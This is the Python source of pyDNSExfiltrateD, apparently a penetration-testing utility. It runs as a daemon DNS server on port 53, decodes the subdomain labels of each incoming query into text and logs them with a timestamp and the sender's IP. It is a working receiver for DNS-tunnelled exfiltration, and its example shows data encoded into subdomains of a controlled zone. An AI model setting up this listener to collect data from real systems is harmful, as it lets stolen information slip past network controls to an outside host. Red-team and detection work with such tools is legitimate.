#! /bin/env python

"""
pyDNSExfiltrateD.py: Act as a DNS listener, and record the lookups to a log file with timestamp & source nameserver IP.

Usage:
pyDNSExfiltrateD.py start|stop|restart

Example:

> dig this.is.a.test.dns.my.domain.com
2016-10-18 18:56:57.715478      1.2.3.4   this is a test

Requirements:
pip install python-daemon dnslib

History:
0.1 - this version
"""

import datetime
import time
import threading
import traceback
import SocketServer
from dnslib import *
from daemon import runner

BASE = ".dns.my.domain.com." # change this to match your registered NS. Must end in .
PID = "/var/run/pyDNS.pid"
LOG = "/var/log/dnsexfil_results.log"
# these next 2 need to be changed to /dev/null if this is running as a service
STDOUT = "/dev/stdout"
STDERR = "/dev/stderr"


class UDPRequestHandler( SocketServer.BaseRequestHandler ):
  def handle(self):

    now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
    try:
      data = self.request[0].strip()
      request = DNSRecord.parse(data)
      qname = str( request.q.qname )
      with open( LOG, 'a' ) as f:
        f.write( "%s\t%s\t%s\n" % ( now, self.client_address[0], qname[:-len(BASE)].replace( '.', ' ' ) ) )

      reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q, a=RR( qname, rdata=A("127.0.0.1") ) )
      self.request[1].sendto( reply.pack(), self.client_address )

    except Exception:
      traceback.print_exc(file=sys.stderr)


class App():

  def __init__(self):
    self.stdin_path = '/dev/null'
    self.stdout_path = STDOUT
    self.stderr_path = STDERR
    self.pidfile_path =  PID
    self.pidfile_timeout = 5

  def run( self ):
    print "Starting nameserver..."
    print "Recording to %s" % LOG

    servers = [
      SocketServer.ThreadingUDPServer( ( '', 53 ), UDPRequestHandler )
    ]

    for s in servers:
      thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
      thread.daemon = True  # exit the server thread when the main thread terminates
      thread.start()

    try:
      while 1:
        time.sleep(1)

    except KeyboardInterrupt:
      pass
    finally:
      for s in servers:
        s.shutdown()


if __name__ == '__main__':
  app = App()
  daemon_runner = runner.DaemonRunner(app)
  daemon_runner.do_action()